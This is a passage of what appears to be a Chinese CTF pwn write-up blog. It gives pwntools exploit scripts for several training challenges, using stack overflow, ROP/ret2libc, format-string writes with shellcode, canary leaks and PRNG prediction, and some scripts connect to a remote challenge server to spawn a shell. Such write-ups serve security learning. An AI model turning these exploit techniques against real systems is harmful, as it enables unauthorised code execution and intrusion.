class="hljs-string">&quot;Success!&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">sub_C3E</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意：下面代码<strong>linux下gcc编译执行</strong>，windows下结果会不同。得到srand参数为0时，伪随机数的结果。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> b;<br><span class="hljs-built_in">srand</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt;=<span class="hljs-number">9</span>; i++)<br>&#123;<br>b = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">6</span> + <span class="hljs-number">1</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, b);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果为：2542625142。代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&quot;61.147.171.105&quot;,&quot;58434&quot;)</span><br>p = process(<span class="hljs-string">&#x27;./guess_num&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>)             <span class="hljs-comment">#溢出到send，使send[0]=0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your name:&quot;</span>,payload)<br>rand = [<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>]       <span class="hljs-comment">#srang(0)时的结果</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;Please input your guess number:&quot;</span>,rand[i])<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><h4 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h4><p>常见各类型占用字节数如下：</p><table><thead><tr><th>类型</th><th>字节</th><th>取值范围</th></tr></thead><tbody><tr><td>int</td><td>4</td><td>-2147483648~2147483647</td></tr><tr><td>short int</td><td>2</td><td>-32768~32767</td></tr><tr><td>long int</td><td>4</td><td>-2147483648~2147483647</td></tr><tr><td>unsigned int</td><td>4</td><td>0~4294967295</td></tr><tr><td>unsigned short int</td><td>2</td><td>0~65535</td></tr><tr><td>unsigned long int</td><td>4</td><td>0~4294967295</td></tr></tbody></table><p>参考：<a href="https://ctf-wiki.org/pwn/linux/user-mode/integeroverflow/introduction/">https://ctf-wiki.org/pwn/linux/user-mode/integeroverflow/introduction/</a></p><img src="image-20230318092551756.png" alt="image-20230318092551756" style="zoom:67%;" /><p>s即传入的passwd长度定义为0x199(409)&gt;0xff(255)，因此长度为000100000100(260)是可以绕过if条件。</p><p>strcpy时，dest长度长度定义为0x14，存在栈溢出，可以构造rop链</p><img src="image-20230318093619154.png" alt="image-20230318093619154" style="zoom:67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&quot;61.147.171.105&quot;,&quot;58434&quot;)</span><br>p = process(<span class="hljs-string">&#x27;./2&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x14</span>+<span class="hljs-number">4</span>)+p32(<span class="hljs-number">0x0804868B</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">232</span>   <br>p.sendlineafter(<span class="hljs-string">b&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Please input your username:&quot;</span>,<span class="hljs-string">b&#x27;demo&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Please input your passwd:&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h3><h4 id="构造ROP链-1"><a href="#构造ROP链-1" class="headerlink" title="构造ROP链"></a>构造ROP链</h4><img src="image-20230318101544901.png" alt="image-20230318101544901" style="zoom:67%;" /><p>存在system函数(0x08048420)，但是并没有给&#x2F;bin&#x2F;sh，需要自己写了入；name参数(0x0804A080)在.bss段，可以写进去一个&#x2F;bin&#x2F;sh，然后s存在栈溢出，可以构造ROP链。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>,<span class="hljs-string">&quot;58434&quot;</span>)<br><span class="hljs-comment">#p = process(&#x27;./2&#x27;)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x26</span>+<span class="hljs-number">4</span>)+p32(<span class="hljs-number">0x08048420</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(<span class="hljs-number">0x0804A080</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;please tell me your name&quot;</span>,<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;hello,you can leave some message here:&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><h4 id="格式化字符串-覆盖任意地址内存-1"><a href="#格式化字符串-覆盖任意地址内存-1" class="headerlink" title="格式化字符串-覆盖任意地址内存"></a>格式化字符串-覆盖任意地址内存</h4><p>提示string应该是格式化字符串，查找printf函数引用，发现漏洞点</p><img src="image-20230318161040887.png" alt="image-20230318161040887" style="zoom:67%;" /><p>v4&#x3D;v4[1]时会执行shellcode</p><img src="image-20230318161256199.png" alt="image-20230318161256199" style="zoom:67%;" /><p>难点在理清程序思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&quot;61.147.171.105&quot;,&quot;58434&quot;)</span><br>p = process(<span class="hljs-string">&#x27;./string&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;secret[0] is &quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)                   <span class="hljs-comment">#获得v4的地址</span><br>p.sendlineafter(<span class="hljs-string">b&quot;What should your character&#x27;s name be:&quot;</span>,<span class="hljs-string">b&#x27;demo&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;So, where you will go?east or up?:&quot;</span>,<span class="hljs-string">b&#x27;east&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;go into there(1), or leave(0)?:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))   <span class="hljs-comment">#b&#x27;1&#x27;会出错，不知道为什么</span><br>p.sendlineafter(<span class="hljs-string">b&quot;&#x27;Give me an address&#x27;&quot;</span>,<span class="hljs-built_in">str</span>(addr)) <br>p.sendlineafter(<span class="hljs-string">b&quot;And, you wish is:&quot;</span>,<span class="hljs-string">b&quot;%85c%7$n&quot;</span>)            <span class="hljs-comment">#v4的值=85=v4[1]</span><br>shell=asm(shellcraft.amd64.sh())<br><span class="hljs-comment">#shell=b&quot;\x48\x31\xc0\x99\xb0\x3b\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x48\x89\xe7\x57\x52\x48\x89\xe6\x0f\x05&quot;</span><br>p.sendlineafter(<span class="hljs-string">b&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>,shell)         <span class="hljs-comment">#写入shellcode</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><h4 id="ROP-ret2libc"><a href="#ROP-ret2libc" class="headerlink" title="ROP-ret2libc"></a>ROP-ret2libc</h4><img src="image-20230318205032501.png" alt="image-20230318205032501" style="zoom:67%;" /><p>流程：</p><ol><li>篡改控制流为read-&gt;write-&gt;main，通过write(1, write_got, 4)得到write函数地址，计算出libc基址</li><li>控制流回到main函数，再次篡改为main-&gt;vulnerable_function-&gt;system(‘&#x2F;bin&#x2F;sh’)，完成ret2libc</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#计算字符串 /bin/sh 地址</span><br>ROPgadget --binary ./libc_32.so.6 --string <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br>strings -a -t x libc_32.so.6 | grep <span class="hljs-string">&quot;/bin/sh&quot;</span>     <br><span class="hljs-comment">#查找函数的位置</span><br>readelf -s libc_32.so.6|grep system<br></code></pre></td></tr></table></figure><p>“&#x2F;bin&#x2F;sh”与write函数的相对距离为0x15902b - 0xd43c0 &#x3D; 0x84c6b；</p><p>system与write的相对距离为0x3a940-0xd43c0&#x3D;-0x99A80</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#获取远程进程对象</span><br>p=remote(<span class="hljs-string">&#x27;61.147.171.105&#x27;</span>,<span class="hljs-number">53144</span>)<br>elf = ELF(<span class="hljs-string">&#x27;level3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc_32.so.6&#x27;</span>)<br><span class="hljs-comment">#char[88]+ebp+write函数地址+write函数返回地址(返回到main函数)+write函数参数一(1)+write函数参数二(write_got地址)+write函数参数三(写4字节)</span><br>payload =<span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>])+p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>p.recv()       <span class="hljs-comment">#接收write在got中的地址</span><br>write_addr = u32(p.recv()[:<span class="hljs-number">4</span>])   <span class="hljs-comment">#反p32，取四字节地址</span><br><br><span class="hljs-comment">#print(hex(libc.symbols[&#x27;system&#x27;]-libc.symbols[&#x27;write&#x27;]))</span><br>payload = <span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(write_addr-<span class="hljs-number">0x99a80</span>)+<span class="hljs-string">b&#x27;0000&#x27;</span>+p32(write_addr+<span class="hljs-number">0x84c6b</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h3><h4 id="栈溢出以及伪随机数-1"><a href="#栈溢出以及伪随机数-1" class="headerlink" title="栈溢出以及伪随机数"></a>栈溢出以及伪随机数</h4><img src="image-20230318215349144.png" alt="image-20230318215349144" style="zoom:67%;" /><img src="image-20230318215450891.png" alt="image-20230318215450891" style="zoom:67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>p=remote(<span class="hljs-string">&#x27;61.147.171.105&#x27;</span>,<span class="hljs-number">62460</span>)<br>libc=cdll.LoadLibrary(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;know your name:&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">0x40</span>+p64(<span class="hljs-number">1</span>)<br>p.sendline(payload)<br>res=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>res.append(libc.rand()%<span class="hljs-number">6</span>+<span class="hljs-number">1</span>)<br><span class="hljs-comment">#print(res)</span><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> res:<br>p.sendlineafter(<span class="hljs-string">b&quot;Give me the point(1~6): &quot;</span>, <span class="hljs-built_in">str</span>(a))<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h3><h4 id="栈溢出-1"><a href="#栈溢出-1" class="headerlink" title="栈溢出"></a>栈溢出</h4><img src="image-20230319092457342.png" alt="image-20230319092457342" style="zoom:67%;" /><img src="image-20230319092525453.png" alt="image-20230319092525453" style="zoom:67%;" /><p>注意填充数据不能满足以下条件，会改变v5的值。</p><img src="image-20230319091840545.png" alt="image-20230319091840545" style="zoom:67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-comment">#p = remote(&quot;61.147.171.105&quot;,&quot;56986&quot;)</span><br>p = process(<span class="hljs-string">&#x27;./forgot&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;What is your name?\n&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;demo&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Enter the string to be validate\n&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x74</span>-<span class="hljs-number">0x54</span>)+p32(<span class="hljs-number">0x80486CC</span>))   <span class="hljs-comment">#取A，ASCII值65</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h3><h4 id="格式化字符串、绕过Canary保护机制、栈溢出"><a href="#格式化字符串、绕过Canary保护机制、栈溢出" class="headerlink" title="格式化字符串、绕过Canary保护机制、栈溢出"></a>格式化字符串、绕过Canary保护机制、栈溢出</h4><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">Canary保护机制<br>在函数开始时就随机产生一个值，将这个值<span class="hljs-built_in">CANARY</span>放到栈上紧挨ebp的上一个位置，当攻击者想通过缓冲区溢出覆盖ebp或者ebp下方的返回地址时，一定会覆盖掉<span class="hljs-built_in">CANARY</span>的值；当程序结束时，程序会检查<span class="hljs-built_in">CANARY</span>这个值和之前的是否一致，如果不一致，则不会往下运行，从而避免了缓冲区溢出攻击<br><br>如果存在字符串格式化漏洞可以输出泄露canary的地址并利用栈溢出覆盖canary的地址返回到system地址从而达到绕过<br></code></pre></td></tr></table></figure><img src="8516cd917e1d4aa38b82c1cac91fb8b4.png" alt="在这里插入图片描述" style="zoom: 80%;" /><img src="image-20230319105614718.png" alt="image-20230319105614718" style="zoom:67%;" /><img src="image-20230319143617038.png" alt="image-20230319143617038" style="zoom:67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-comment">#p = process(&quot;./1&quot;)</span><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>,<span class="hljs-number">61806</span>)<br><br>sys_addr = <span class="hljs-number">0x0004008DA</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;battle \n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;%23$p&quot;</span>) <br>c = p.recv()<br>canary = <span class="hljs-built_in">int</span>(c,<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(canary)<br><br>p.recvuntil(<span class="hljs-string">b&quot;battle \n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(sys_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><h4 id="盲打栈溢出"><a href="#盲打栈溢出" class="headerlink" title="盲打栈溢出"></a>盲打栈溢出</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sys = <span class="hljs-number">0x40060d</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">try</span>:<br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>,<span class="hljs-number">64494</span>)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*i + p64(sys)<br>p.recvuntil(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>p.sendline(payload)<br><span class="hljs-built_in">print</span>(p.recv())<br>p.interactive()<br><span class="hljs-keyword">except</span>:<br>p.close()<br></code></pre></td></tr></table></figure><h3 id="stack2⭐"><a href="#stack2⭐" class="headerlink" title="stack2⭐"></a>stack2⭐</h3><h4 id="未检查数组边界，造成任意地址修改"><a href="#未检查数组边界，造成任意地址修改" class="headerlink" title="未检查数组边界，造成任意地址修改"></a>未检查数组边界，造成任意地址修改</h4><img src="image-20230319171506698.png" alt="image-20230319171506698" style="zoom:67%;" /><p>hackhere函数存在system(“&#x2F;bin&#x2F;sh”)，地址0x0804859B</p><p>重点就要确定的就是main函数返回位置距离数组的偏移</p><p>根据代码和汇编指令确定数组首地址，运行到ret时ESP值就是main函数返回地址，相减得到偏移0x84。</p><img src="image-20230319193954490.png" alt="image-20230319193954490" style="zoom: 67%;" /><img src="image-20230319194033905.png" alt="image-20230319194033905" style="zoom: 67%;" /><p>通过ida直接找返回地址相对于数组的偏移算出来是有问题的，因为是函数最后使用leave和lea指令调整了栈帧，将栈底恢复到了之前的位置。栈底发生了变化，偏移量也就变化了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">offest,by</span>):<br>p.sendafter(<span class="hljs-string">&#x27;exit&#x27;</span>,<span class="hljs-string">&#x27;3\n&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;r to change:&#x27;</span>,<span class="hljs-built_in">str</span>(offest)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;number:&#x27;</span>,<span class="hljs-built_in">str</span>(by)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./stack2&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;61.147.171.105&#x27;,53919)</span><br>p.sendafter(<span class="hljs-string">&#x27;y numbers you have:&#x27;</span>,<span class="hljs-string">&#x27;0\n&#x27;</span>)<br><span class="hljs-comment">#小端序写入0x8004859B</span><br>change(<span class="hljs-number">0x84</span>,<span class="hljs-number">0x9B</span>)      <br>change(<span class="hljs-number">0x85</span>,<span class="hljs-number">0x85</span>)<br>change(<span class="hljs-number">0x86</span>,<span class="hljs-number">0x04</span>)<br>change(<span class="hljs-number">0x87</span>,<span class="hljs-number">0x08</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;exit&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>本地没有问题，远程报错服务器找不到bash。（出题人的问题）</p><p>改变思路，使用程序里的system函数，以及sh字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">offest,by</span>):<br>p.sendafter(<span class="hljs-string">&#x27;exit&#x27;</span>,<span class="hljs-string">&#x27;3\n&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;r to change:&#x27;</span>,<span class="hljs-built_in">str</span>(offest)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;number:&#x27;</span>,<span class="hljs-built_in">str</span>(by)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./3&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;61.147.171.105&#x27;</span>,<span class="hljs-number">53919</span>)<br>p.sendafter(<span class="hljs-string">&#x27;y numbers you have:&#x27;</span>,<span class="hljs-string">&#x27;0\n&#x27;</span>)<br>change(<span class="hljs-number">0x84</span>,<span class="hljs-number">0x50</span>)<br>change(<span class="hljs-number">0x85</span>,<span class="hljs-number">0x84</span>)<br>change(<span class="hljs-number">0x86</span>,<span class="hljs-number">0x04</span>)<br>change(<span class="hljs-number">0x87</span>,<span class="hljs-number">0x08</span>)<br><span class="hljs-comment">#注意这里需要空出0x4来，所以从0x8c开始</span><br>change(<span class="hljs-number">0x8c</span>,<span class="hljs-number">0x87</span>)<br>change(<span class="hljs-number">0x8d</span>,<span class="hljs-number">0x89</span>)<br>change(<span class="hljs-number">0x8e</span>,<span class="hljs-number">0x04</span>)<br>change(<span class="hljs-number">0x8f</span>,<span class="hljs-number">0x08</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;exit&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwn-100⭐"><a href="#pwn-100⭐" class="headerlink" title="pwn-100⭐"></a>pwn-100⭐</h3><h4 id="ROP-ret2csu"><a href="#ROP-ret2csu" class="headerlink" title="ROP-ret2csu"></a>ROP-ret2csu</h4><p>参考:<a href="https://blog.csdn.net/qin9800/article/details/104759217">https://blog.csdn.net/qin9800/article/details/104759217</a></p><img src="image-20230320144505160.png" alt="image-20230320144505160" style="zoom:80%;" /><p>开了NX，没办法直接往栈上写ShellCode</p><p>read读取0xC8个字符，而用户输入数据的首地址到ebp只有0x40个字节，存在栈溢出</p><p>程序没有提供libc，也没有system函数，但是有puts函数，可以通过pwntools的DynELF来远程获取libc（也可以使用LibcSearcher）</p><p>DynELF参考：<a href="https://blog.csdn.net/qq_40827990/article/details/86689760">https://blog.csdn.net/qq_40827990/article/details/86689760</a></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">使用 ROPgadget 工具搜索到的 <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span> <span class="hljs-comment">; ret 语句的地址</span><br>因为我们需要这两条语句将栈中随后的两个内容分别作为 <span class="hljs-built_in">rdi</span> 的内容和返回地址来处理，搜索的方法可以使用诸如<br>ROPgadget --binary pwn100 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rdi&quot;</span><br></code></pre></td></tr></table></figure><p>ret2csu参考：<a href="https://blog.csdn.net/AcSuccess/article/details/104448463">https://blog.csdn.net/AcSuccess/article/details/104448463</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 